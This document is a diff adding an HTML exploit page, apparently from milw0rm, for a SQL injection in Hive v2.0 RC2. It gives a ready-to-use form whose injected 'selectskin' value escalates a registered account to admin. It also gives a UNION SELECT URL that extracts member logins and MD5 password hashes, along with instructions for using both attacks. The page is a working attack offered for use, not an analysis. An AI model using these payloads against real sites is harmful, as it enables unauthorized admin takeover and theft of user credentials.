@@ -1,0 +1,129 @@
+<!--
+    Hive v2.0 RC2 Remote SQL Injection
+    c0ded by j0j0
+-->
+<html>
+<head>
+<style type="text/css">
+body {
+    margin:3%;
+    font-size:10px;
+    color:#FFFFFF;
+    font-family:Verdana,Arial;
+    background-color:#1a1a1a;
+    text-align: center;
+}
+input {
+    background:#303030;
+    color:#FFFFFF;
+    font-family:Verdana,Arial;
+    font-size:10px;
+    vertical-align:middle;
+    border-left:1px solid #5d5d5d;
+    border-right:1px solid #121212;
+    border-bottom:1px solid #121212;
+    border-top:1px solid #5d5d5d;
+    padding: 3px;
+    margin: 2px;
+}
+input[type=text] {
+    width: 200px;
+}
+textarea {
+    background:#303030;
+    color:#FFFFFF;
+    font-family:Verdana,Arial;
+    font-size:10px;
+    vertical-align:middle;
+    border-left:1px solid #121212;
+    border-right:1px solid #5d5d5d;
+    border-bottom:1px solid #5d5d5d;
+    border-top:1px solid #121212;
+}
+table td {
+    font-size: 10px;
+    font-family: Verdana, Arial;
+}
+h3 { color: #CC0000; }
+a {
+    color: #999999;
+    text-decoration: none;
+    font-weight: bold;
+}
+#exploit {
+    font-family: Courier New, sans-ms;
+    font-size: 12px;
+    color: #00FF00;
+    width: 400px;
+    text-align: left;
+}
+</style>
+</head>
+<body>
+<center>
+<h3>Hive v2.0 RC2 Remote SQL Injection<br /><br />-= c0ded by j0j0 =-</h3>
+<br />
+<p>you must first create an account, and log in.<br />
+then you can send exploit<br />
+<span style="color:#cc0000;">don't forget to change the action="" URL of this form</span></p>
+<p>&nbsp;</p>
+
+<table width="600px" cellspacing="1">
+    <tr>
+        <td width="20%" class="td5_2">Username</td>
+        <td class="td5_1"><input type="text" name="id" value="admin" /></td>
+        <td>you will use this username to login</td>
+    </tr>
+    <tr>
+        <td class="td5_2">Password</td>
+        <td class="td5_1"><input type="text" name="password" value="admin" /></td>
+        <td>you will use this password to login</td>
+    </tr>
+    <tr>
+        <td class="td5_2">Mail</td>
+        <td class="td5_1"><input type="text" class="texte" name="mail" size="24" value="You_Were_H4ck3d@microsoft.com" /></td>
+        <td>email doesn't have importance</td>
+    </tr>
+    <tr>
+        <td class="td5_2">SQL Injection</td>
+        <td colspan="3" class="td5_1">
+            <input name="selectskin" type="text" value="purpletech', niveau_num=4 WHERE num=2 /*"/>
+        </td>
+    </tr>
+</table>
+<p>purpletech', niveau_num=4 WHERE num=2 /*  <-- niveau_num is for admin access / num is the member id (default admin id is 2)<br /></p>
+<br>
+<input type="submit" name="submitButtonName" value="Attack">
+<p>&nbsp;</p>
+<p>Now you are admin, logout and re-login with new username/password</p>
+<p>There is another one injection   :
+<div style="max-width:500px;">
+    http://{HOST}/{PATH}/base.php?page=gestion_membre.php&var=profil&user_id=-9999999'/**/UNION/**/SELECT/**/
+
+    0,concat(nick,char(58),pass),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0/**/FROM/**/_user/**/WHERE<br />/**/{SQL_PREFIX}_user.num={MEMBER_ID}/**//*<br />
+</div>
+<br /><br />
+Change {HOST}, {PATH}, {SQL_PREFIX} and {MEMBER_ID}<br />
+then look at the "Pseudonyme" field, you've got LOGIN:MD5_PASSWORD)</p>
+<!--
+Hidden inputs
+-->
+<input type="hidden" class="texte" name="nom" size="24" value="h4ck3d" >
+<input type="hidden" class="texte" name="prenom" size="24" value="h4ck3d" >
+<input type="hidden" class="texte" name="age" size="24" value="h4ck3d"  >
+<input type="hidden" class="texte" name="icq" size="24" value="h4ck3d"  >
+<input type="hidden" class="texte" name="adresse" size="24" value="h4ck3d"  >
+<input type="hidden" class="texte" name="msn" size="24" value="h4ck3d"  >
+<input type="hidden" class="texte" name="aim" size="24" value="h4ck3d"  >
+<input type="hidden" class="texte" name="hobbie" size="24" value="h4ck3d"  >
+<input type="hidden" class="texte" name="yahoo" size="24" value="h4ck3d"  >
+<input type="hidden" class="texte" name="site" size="24" value="h4ck3d"  >
+<input type="hidden" class="texte" name="text" size="24" value="h4ck3d"  >
+<input type="hidden" class="texte" name="selectlangue" size="24" value="h4ck3d"  >
+<input type="hidden" value="false" name="online"  >
+</form>
+</center>
+</body>
+</html>
+
+# milw0rm.com [2008-01-11]
